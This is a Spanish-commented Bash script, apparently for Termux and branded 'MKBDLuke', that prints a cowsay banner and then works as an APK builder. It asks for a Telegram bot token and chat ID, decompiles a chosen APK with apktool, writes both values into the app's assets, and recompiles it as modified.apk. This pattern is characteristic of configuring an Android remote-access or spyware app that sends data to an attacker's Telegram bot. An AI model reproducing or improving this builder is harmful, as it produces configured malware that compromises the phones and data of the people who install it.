#!/bin/bash
if ! command -v fortune &> /dev/null; then
    pkg install fortune
fi
if ! command -v cowsay &> /dev/null; then
    pkg install cowsay
fi
if ! command -v figlet &> /dev/null; then
    pkg install figlet
fi
if ! command -v toilet &> /dev/null; then
    pkg install toilet
fi
if ! command -v lolcat &> /dev/null; then
    gem install lolcat
fi
message=$(fortune)
cowsay -l | tail -n +2 | cut -f 1 -d " " > .cow.txt
cows=($(cat .cow.txt))
cow="${cows[$RANDOM % ${#cows[@]}]}"
figlet -f slant "¡Bienvenido!" | cowsay -f "$cow" "$message" | toilet -f term -F gay | lolcat

# Eliminar el archivo .cow.txt
rm -f .cow.txt
toilet -f big ' MKBDLuke' -F gay | lolcat
#Declaracion de la funcion show_menu.
original_path="$(pwd)"
function show_menu() {
    local current_folder="$1"
    local options=("Atrás")
    local i=1
    for file in "$current_folder"/*; do
        if [ -d "$file" ]; then
            options+=("$(basename "$file")/")
        elif [ "${file##*.}" = "apk" ]; then
            options+=("$(basename "$file")")
        fi
        ((i++))
    done

    local prompt="Elige una opción:"
    local PS3="$prompt "
    select opt in "${options[@]}"; do
        if [ "$opt" = "Atrás" ]; then
            return 1
        elif [ -d "$current_folder/$opt" ]; then
            show_menu "$current_folder/$opt"
            return $?
        else
            apk_file="$current_folder/$opt"
            return 0
        fi
    done
}

#Comprobar si apktool está instalado
if ! command -v apktool &> /dev/null; then
    echo "APK Tool no está instalado en tu sistema."
    exit
fi
#Obtener el token de bot y el id chat de Telegram.
cyan_color="\033[36m"
reset_color="\033[0m"


echo -e "${cyan_color}¿Cuál es tu token de bot de Telegram?${reset_color} ==> \c"
read token


echo -e "${cyan_color}¿Cuál es tu ID de chat de Telegram?${reset_color} ==> \c"
read chat_id

#Navegacion del script para encontrar un apk.
current_folder="$HOME/MkBdLuke-/"

while true; do

    apk_file=""
    echo "escoge un archivo .apk RUTA: $current_folder"

    show_menu "$current_folder"

    if [ $? -eq 1 ]; then
        next_folder=$(realpath "$current_folder/..")

        # Comprobamos si el directorio es igual o superior a HOME

        if [[ "$next_folder" == "$HOME/MkBdLuke/"* ]]; then
            current_folder=$next_folder
        else
            echo "$HOME/MkBdLuke-/"
        fi
    else
        if [ -z "$apk_file" ]; then
            echo "Error: No se ha seleccionado un archivo APK."
            continue
        else
            # Descompilar el apk encontrado.
            apk_directory=$(dirname "$apk_file")
            decompiled_apk="$apk_directory/decompiled"
            apktool d "$apk_file" -o "$decompiled_apk"

            if [ $? -eq 0 ]; then
                # Insertar los cambios en el apk.
                echo "$token" > "$decompiled_apk/assets/token.txt"
                echo "$chat_id" > "$decompiled_apk/assets/id.txt"

                # Compilar la APK modificada
                cd "$decompiled_apk"
                apktool empty-framework-dir --force
                if apktool b . -o modified.apk; then
                    echo "¡Compilación completada con éxito!"
                    # Mover el APK compilado a la carpeta inicial
                    mv modified.apk "$original_path/modified.apk"
                else
                    echo "Error al compilar la APK: $(cat apktool.err)"
                    echo "¿Deseas intentar con otro archivo APK?"
                    select yn in "Sí" "No"; do
                        case $yn in
                            Sí )
                                continue 2;;
                            No )
                                echo "El script ha terminado."
                                # Limpieza: eliminar la carpeta 'decompiled' si la compilación falla
                                rm -rf "$decompiled_apk"
                                exit;;
                        esac
                    done
                fi
                # Eliminar la carpeta decompiled si todo va bien
                cd "$original_path"
                rm -rf "$decompiled_apk"
                break
            else
                echo "Error al descompilar el APK. ¿Deseas buscar nuevamente?"
                select yn in "Sí" "No"; do
                    case $yn in
                        Sí )
                            break;;
                        No )
                            echo "Error, ejecuta el script nuevamente"
                            exit;;
                    esac
                done
            fi
        fi
    fi
done
